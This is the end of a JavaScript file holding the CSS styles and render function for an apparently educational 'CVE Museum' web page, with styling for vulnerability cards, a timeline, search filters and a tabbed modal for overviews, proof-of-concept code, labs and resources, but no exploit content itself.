        .museum-search { display: flex; align-items: center; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 30px; padding: 10px 20px; gap: 10px; }
        .museum-search input { background: none; border: none; color: #fff; width: 200px; outline: none; }
        .museum-search i { color: rgba(255,255,255,0.5); }
        
        .museum-timeline { background: rgba(0,0,0,0.3); padding: 25px 40px; border-radius: 15px; margin-bottom: 25px; overflow-x: auto; }
        .timeline-track { display: flex; justify-content: space-between; position: relative; min-width: 600px; }
        .timeline-track::before { content: ''; position: absolute; top: 15px; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, #ffd700, #00ff88); }
        .timeline-point { text-align: center; cursor: pointer; position: relative; z-index: 1; transition: transform 0.2s; }
        .timeline-point:hover { transform: scale(1.1); }
        .point-dot { width: 30px; height: 30px; background: #1a1a2e; border: 3px solid #ffd700; border-radius: 50%; margin: 0 auto 10px; box-shadow: 0 0 15px rgba(255,215,0,0.3); }
        .point-year { font-weight: 700; font-size: 1.1rem; color: #ffd700; }
        .point-count { font-size: 0.8rem; color: rgba(255,255,255,0.5); }
        
        .museum-filters { display: flex; gap: 15px; margin-bottom: 25px; flex-wrap: wrap; }
        .museum-filters select { background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); color: #fff; padding: 10px 15px; border-radius: 8px; cursor: pointer; }
        .reset-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; padding: 10px 20px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all 0.2s; }
        .reset-btn:hover { background: rgba(255,255,255,0.1); }
        
        .cve-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
        .cve-card { background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 20px; cursor: pointer; transition: all 0.3s; position: relative; overflow: hidden; }
        .cve-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, #ffd700, #ff6b6b); }
        .cve-card:hover { transform: translateY(-5px); border-color: rgba(255,215,0,0.3); box-shadow: 0 15px 40px rgba(0,0,0,0.4); }
        .cve-icon { font-size: 2.5rem; margin-bottom: 15px; }
        .cve-header { margin-bottom: 10px; }
        .cve-header h3 { font-size: 1.3rem; margin: 0; color: #fff; }
        .cve-id { font-size: 0.85rem; color: rgba(255,255,255,0.5); font-family: 'JetBrains Mono', monospace; }
        .cve-meta { display: flex; gap: 15px; margin-bottom: 12px; }
        .cve-year, .cve-cvss { font-size: 0.85rem; display: flex; align-items: center; gap: 5px; }
        .cve-year { color: rgba(255,255,255,0.6); }
        .cve-summary { font-size: 0.9rem; color: rgba(255,255,255,0.7); line-height: 1.5; margin-bottom: 15px; }
        .cve-tags { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .tag { padding: 4px 10px; border-radius: 4px; font-size: 0.75rem; font-weight: 600; }
        .tag.category { background: rgba(0,255,136,0.15); color: #00ff88; }
        .severity-critical { background: rgba(239,68,68,0.2); color: #ef4444; }
        .severity-high { background: rgba(249,115,22,0.2); color: #f97316; }
        .severity-medium { background: rgba(234,179,8,0.2); color: #eab308; }
        .cve-actions { display: flex; gap: 15px; font-size: 0.85rem; color: rgba(255,255,255,0.5); }
        .cve-actions span { display: flex; align-items: center; gap: 5px; }
        
        .no-results { text-align: center; padding: 60px; color: rgba(255,255,255,0.5); font-size: 1.2rem; }
        
        .museum-modal { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: none; align-items: center; justify-content: center; padding: 20px; }
        .museum-modal.open { display: flex; }
        .modal-content { background: #13131f; border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; width: 100%; max-width: 900px; max-height: 90vh; overflow-y: auto; position: relative; }
        .modal-close { position: absolute; top: 20px; right: 20px; background: rgba(255,255,255,0.1); border: none; color: #fff; width: 40px; height: 40px; border-radius: 50%; cursor: pointer; font-size: 1.2rem; z-index: 10; }
        
        .modal-header { display: flex; align-items: center; gap: 20px; padding: 30px; background: rgba(0,0,0,0.3); border-radius: 20px 20px 0 0; }
        .modal-icon { font-size: 3rem; }
        .modal-title { flex: 1; }
        .modal-title h2 { margin: 0; font-size: 1.8rem; }
        .modal-cve-id { color: rgba(255,255,255,0.5); font-family: 'JetBrains Mono', monospace; }
        .modal-cvss { text-align: center; padding: 15px 20px; border-radius: 10px; }
        .cvss-score { display: block; font-size: 2rem; font-weight: 700; }
        .cvss-label { font-size: 0.8rem; text-transform: uppercase; }
        
        .modal-tabs { display: flex; border-bottom: 1px solid rgba(255,255,255,0.1); padding: 0 20px; }
        .tab-btn { background: none; border: none; color: rgba(255,255,255,0.5); padding: 15px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; font-size: 0.95rem; border-bottom: 2px solid transparent; transition: all 0.2s; }
        .tab-btn:hover { color: #fff; }
        .tab-btn.active { color: #ffd700; border-bottom-color: #ffd700; }
        
        .modal-body { padding: 30px; }
        
        .tab-overview {}
        .overview-section { margin-bottom: 20px; }
        .overview-section h4 { display: flex; align-items: center; gap: 10px; color: #ffd700; margin-bottom: 10px; font-size: 1.1rem; }
        .overview-section p { color: rgba(255,255,255,0.8); line-height: 1.7; }
        .overview-section.lesson { background: rgba(0,255,136,0.1); border-left: 3px solid #00ff88; padding: 15px 20px; border-radius: 0 10px 10px 0; }
        .overview-section.lesson h4 { color: #00ff88; }
        .overview-meta { display: flex; gap: 20px; flex-wrap: wrap; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }
        .overview-meta span { display: flex; align-items: center; gap: 8px; color: rgba(255,255,255,0.6); }
        
        .tab-poc {}
        .poc-warning { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 15px 20px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; }
        .poc-warning i { color: #ef4444; font-size: 1.5rem; }
        .poc-warning p { margin: 5px 0 0 0; color: rgba(255,255,255,0.7); font-size: 0.9rem; }
        .poc-code { background: #0a0a0f; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; }
        .code-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; background: rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.1); }
        .code-header button { background: rgba(255,255,255,0.1); border: none; color: #fff; padding: 6px 12px; border-radius: 5px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .poc-code pre { margin: 0; padding: 20px; overflow-x: auto; }
        .poc-code code { color: #00ff88; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; white-space: pre; }
        
        .tab-lab {}
        .lab-info { text-align: center; padding: 30px; background: rgba(0,0,0,0.3); border-radius: 15px; margin-bottom: 20px; }
        .lab-info i { font-size: 3rem; color: #2496ed; margin-bottom: 15px; }
        .lab-info h4 { margin: 0 0 10px; font-size: 1.3rem; }
        .docker-command { display: flex; align-items: center; gap: 10px; background: #0a0a0f; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; }
        .docker-command code { flex: 1; color: #00ff88; font-family: 'JetBrains Mono', monospace; }
        .docker-command button { background: rgba(255,255,255,0.1); border: none; color: #fff; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
        .lab-steps { background: rgba(0,0,0,0.2); padding: 20px; border-radius: 10px; }
        .lab-steps h5 { margin: 0 0 15px; color: #ffd700; }
        .lab-steps ol { margin: 0; padding-left: 20px; color: rgba(255,255,255,0.8); }
        .lab-steps li { margin-bottom: 10px; }
        .lab-note { background: rgba(255,215,0,0.1); border: 1px solid rgba(255,215,0,0.2); padding: 20px; border-radius: 10px; display: flex; align-items: flex-start; gap: 15px; }
        .lab-note i { color: #ffd700; font-size: 1.5rem; }
        
        .tab-resources {}
        .resource-link { display: flex; align-items: center; gap: 15px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; margin-bottom: 15px; text-decoration: none; color: #fff; transition: all 0.2s; }
        .resource-link:hover { border-color: rgba(255,215,0,0.3); transform: translateX(5px); }
        .resource-link > i:first-child { font-size: 2rem; width: 50px; text-align: center; }
        .resource-link.video > i:first-child { color: #ff0000; }
        .resource-link.paper > i:first-child { color: #00ff88; }
        .resource-link.mitre > i:first-child { color: #8b5cf6; }
        .resource-link.nvd > i:first-child { color: #3b82f6; }
        .resource-link div { flex: 1; }
        .resource-link h5 { margin: 0 0 5px; font-size: 1.1rem; }
        .resource-link p { margin: 0; color: rgba(255,255,255,0.6); font-size: 0.9rem; }
        .resource-link > i:last-child { color: rgba(255,255,255,0.3); }
        
        .museum-notif { position: fixed; top: 20px; right: 20px; padding: 15px 25px; background: rgba(0,255,136,0.9); color: #000; font-weight: 600; border-radius: 8px; z-index: 10000; animation: slideIn 0.3s; }
        @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        
        @media (max-width: 768px) {
            .museum-header { flex-direction: column; text-align: center; }
            .museum-title { flex-direction: column; gap: 5px; }
            .museum-title .subtitle { margin-left: 0; }
            .modal-header { flex-direction: column; text-align: center; }
            .modal-tabs { overflow-x: auto; }
            .tab-btn { font-size: 0.85rem; padding: 12px 15px; white-space: nowrap; }
        }
        `;
    }
};

// Page function
function pageCVEMuseum() {
    return CVEMuseum.render();
}
window.pageCVEMuseum = pageCVEMuseum;
